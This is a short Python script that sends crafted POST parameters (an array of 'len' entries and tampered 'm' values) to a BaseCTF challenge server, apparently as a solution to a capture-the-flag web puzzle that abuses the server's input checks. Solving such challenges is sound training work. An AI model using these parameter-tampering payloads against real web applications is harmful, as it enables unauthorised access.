import requests

url = 'http://challenge.basectf.fun:23980/?tip=我要玩原神'
len_size = 45
data = {}

for i in range(len_size):
    data[f'len[{i}]'] = 'ff'

data['m[0]'] = '100%'
data['m[1]'] = 'love100%30bd7ce7de206924302499f197c7a966'

print(data)
r = requests.post(url, data=data)
print(len_size,r.text.split('</code>')[-1])